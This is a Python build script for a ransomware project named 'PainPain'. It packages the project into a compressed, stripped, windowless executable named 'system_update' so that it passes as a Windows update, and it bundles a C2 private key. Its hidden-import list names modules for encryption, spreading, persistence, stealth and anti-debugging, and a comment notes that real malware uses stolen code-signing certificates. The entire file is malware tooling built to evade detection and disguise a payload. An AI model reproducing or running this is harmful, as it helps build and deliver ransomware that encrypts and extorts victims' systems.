#!/usr/bin/env python3
"""
Build script for creating obfuscated ransomware executable.
Uses PyInstaller with UPX compression and various obfuscation techniques.
"""

import os
import subprocess
import sys
from pathlib import Path


def check_pyinstaller():
    """Check if PyInstaller is installed."""
    try:
        import PyInstaller
        return True
    except ImportError:
        return False


def check_upx():
    """Check if UPX is available."""
    import shutil
    upx_path = shutil.which("upx")
    return upx_path is not None


def create_spec_file(output_name: str = "system_update"):
    """Create PyInstaller spec file with obfuscation settings."""

    spec_content = f'''# -*- mode: python ; coding: utf-8 -*-
import sys
sys.setrecursionlimit(5000)

block_cipher = None

a = Analysis(
    ['main.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'ransomware',
        'ransomware.config',
        'ransomware.core',
        'ransomware.logging',
        'ransomware.exceptions',
        'ransomware.crypto',
        'ransomware.crypto.encryptor',
        'ransomware.crypto.keys',
        'ransomware.discovery',
        'ransomware.discovery.discoverer',
        'ransomware.network',
        'ransomware.network.client',
        'ransomware.gui',
        'ransomware.gui.main',
        'ransomware.persistence',
        'ransomware.spread',
        'ransomware.stealth',
        'ransomware.utils',
        'ransomware.obfuscation',
        'ransomware.obfuscation.string_crypto',
        'ransomware.obfuscation.anti_debug',
        'ransomware.obfuscation.code_transforms',
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[
        'matplotlib',
        'numpy',
        'pandas',
        'scipy',
        'tkinter.test',
        'unittest',
        'pydoc',
        'email',
        'http',
        'xml',
        'html',
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries + [('c2_private_key.pem', 'c2_private_key.pem', 'DATA')],
    a.zipfiles,
    a.datas,
    [],
    name='{output_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # Windowed mode
    disable_windowed_traceback=True,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    # Icon to masquerade as legitimate Windows update
    icon='NONE',
)
'''

    spec_path = f"{output_name}.spec"
    with open(spec_path, 'w') as f:
        f.write(spec_content)

    return spec_path


def obfuscate_bytecode(source_dir: str):
    """
    Apply bytecode-level obfuscation.
    This is a placeholder for real bytecode manipulation.
    """
    print(f"[!] Bytecode obfuscation would be applied to: {source_dir}")
    print("[!] In production, would use pyarmor or similar tool")


def build_executable(spec_file: str, clean: bool = True):
    """Build executable using PyInstaller."""

    cmd = [
        sys.executable, "-m", "PyInstaller",
        spec_file,
        "--clean" if clean else "",
        "--noconfirm",
    ]

    # Filter out empty strings
    cmd = [c for c in cmd if c]

    print(f"[*] Running: {' '.join(cmd)}")

    result = subprocess.run(cmd, capture_output=False)

    return result.returncode == 0


def apply_upx(exe_path: str):
    """Apply UPX compression to executable."""
    import shutil

    upx = shutil.which("upx")
    if upx is None:
        print("[!] UPX not found in PATH")
        return False

    cmd = [upx, "--best", "--lzma", exe_path]
    result = subprocess.run(cmd, capture_output=True)

    if result.returncode == 0:
        print(f"[+] UPX compression applied: {exe_path}")
        return True
    else:
        print(f"[!] UPX failed: {result.stderr.decode()}")
        return False


def sign_executable(exe_path: str, cert_path: str = None):
    """
    Sign executable with certificate (optional).
    In real malware, stolen certificates are used.
    """
    if cert_path is None or not os.path.exists(cert_path):
        print("[!] Skipping code signing (no certificate)")
        return False

    print(f"[*] Would sign {exe_path} with {cert_path}")
    return True


def main():
    """Main build process."""
    print("=" * 60)
    print("PainPain Ransomware - Obfuscated Build Script")
    print("=" * 60)
    print()

    # Check prerequisites
    if not check_pyinstaller():
        print("[!] PyInstaller not installed. Install with:")
        print("    pip install pyinstaller")
        return 1

    upx_available = check_upx()
    if upx_available:
        print("[+] UPX found - compression enabled")
    else:
        print("[!] UPX not found - compression disabled")
        print("    Install UPX from https://upx.github.io/")

    print()

    # Create spec file
    output_name = "system_update"
    print(f"[*] Creating spec file: {output_name}.spec")
    spec_file = create_spec_file(output_name)

    # Obfuscate bytecode (placeholder)
    print("[*] Applying bytecode obfuscation...")
    obfuscate_bytecode("ransomware/")

    # Build
    print("[*] Building executable...")
    if build_executable(spec_file):
        print(f"[+] Build successful!")

        exe_path = f"dist/{output_name}.exe" if os.name == 'nt' else f"dist/{output_name}"

        if os.path.exists(exe_path):
            size = os.path.getsize(exe_path)
            print(f"[+] Output: {exe_path} ({size:,} bytes)")

            # Apply UPX if available
            if upx_available:
                apply_upx(exe_path)

            # Check for signing certificate
            cert_path = "cert.pfx"
            if os.path.exists(cert_path):
                sign_executable(exe_path, cert_path)
        else:
            print("[!] Executable not found at expected path")
    else:
        print("[!] Build failed")
        return 1

    print()
    print("=" * 60)
    print("Build complete!")
    print("=" * 60)

    return 0


if __name__ == "__main__":
    sys.exit(main())
